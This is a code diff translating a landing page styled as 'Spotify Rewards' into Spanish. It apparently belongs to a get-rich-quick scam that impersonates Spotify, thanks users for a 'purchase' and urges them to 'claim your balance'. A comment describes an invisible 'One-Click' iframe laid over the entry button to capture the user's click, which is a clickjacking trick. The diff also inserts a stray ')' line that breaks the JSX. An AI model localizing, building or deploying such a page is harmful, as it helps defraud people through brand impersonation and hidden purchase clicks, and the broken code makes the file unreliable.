@@ -13,10 +13,10 @@ declare global {
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Access Confirmed | Spotify Rewards" },
-      { name: "description", content: "Your registration has been completed successfully." },
-      { property: "og:title", content: "Access Confirmed | Spotify Rewards" },
-      { property: "og:description", content: "Your registration has been completed successfully." },
+      { title: "Acceso Confirmado | Spotify Rewards" },
+      { name: "description", content: "Tu registro ha sido completado con éxito." },
+      { property: "og:title", content: "Acceso Confirmado | Spotify Rewards" },
+      { property: "og:description", content: "Tu registro ha sido completado con éxito." },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
     ],
@@ -25,7 +25,7 @@ export const Route = createFileRoute("/")({
 });
 
 const WELCOME_TEXT =
-  "Thank you for your purchase! We are happy that you decided to be part of the largest extra income movement with Spotify. We hope you enjoy the selected songs for you to evaluate and, even more, we hope you can become one of our success stories. You will be redirected";
+  "¡Gracias por tu compra! Estamos muy felices de que hayas decidido formar parte del mayor movimiento de ingresos extra con Spotify. Esperamos que disfrutes de las canciones seleccionadas para evaluar e, incluso más, esperamos que te conviertas en una de nuestras historias de éxito. Serás redirigido";
 
 function SpotifyLogo({ className }: { className?: string }) {
   return (
@@ -85,7 +85,7 @@ function WelcomeScreen({ onComplete }: { onComplete: () => void }) {
         </svg>
       </div>
       <h2 className="mb-4 text-[18px] font-bold tracking-[-0.3px] text-white">
-        Welcome to Spotify Rewards
+        Bienvenido a Spotify Rewards
       </h2>
       <p className="min-h-[120px] text-left text-[14.5px] leading-[1.7] text-[#a7a7a7]">
         {displayedText}
@@ -163,10 +163,10 @@ function SuccessScreen() {
       </div>
 
       <h1 className="mb-3 text-[26px] font-black tracking-[-0.5px] text-white">
-        ACCESS GRANTED!
+        ¡ACCESO CONCEDIDO!
       </h1>
       <p className="mb-7 text-[14.5px] leading-relaxed text-[#a7a7a7]">
-        Your registration has been completed successfully. Click the button below to enter the application and claim your balance.
+        Tu registro ha sido completado con éxito. Haz clic en el botón de abajo para ingresar a la aplicación y reclamar tu saldo.
       </p>
 
       {/* Button Container */}
@@ -175,7 +175,7 @@ function SuccessScreen() {
         onPointerDown={handleContainerClick}
         className="relative mb-5 h-[56px] w-full overflow-hidden rounded-full cursor-pointer"
       >
-        {/* Botão Visível com animação de spinner e texto LOADING... */}
+        {/* Botão Visível com animação de spinner e texto CARGANDO... */}
         <button
           type="button"
           disabled={isLoading}
@@ -187,11 +187,12 @@ function SuccessScreen() {
                 <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                 <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
               </svg>
-              <span>LOADING...</span>
+              <span>CARGANDO...</span>
             </div>
           ) : (
-            "ENTER THE APPLICATION"
+            "INGRESAR A LA APLICACIÓN"
           )}
+        )
         </button>
 
         {/* Renderiza o iframe invisível do One-Click por cima até o clique acontecer */}
@@ -256,7 +257,7 @@ function Index() {
         </div>
 
         <footer className="my-5 text-center text-[11px] tracking-[0.2px] text-[#535353]">
-          &copy; 2026 Spotify Rewards. All rights reserved.
+          &copy; 2026 Spotify Rewards. Todos los derechos reservados.
         </footer>
       </main>
     </div>
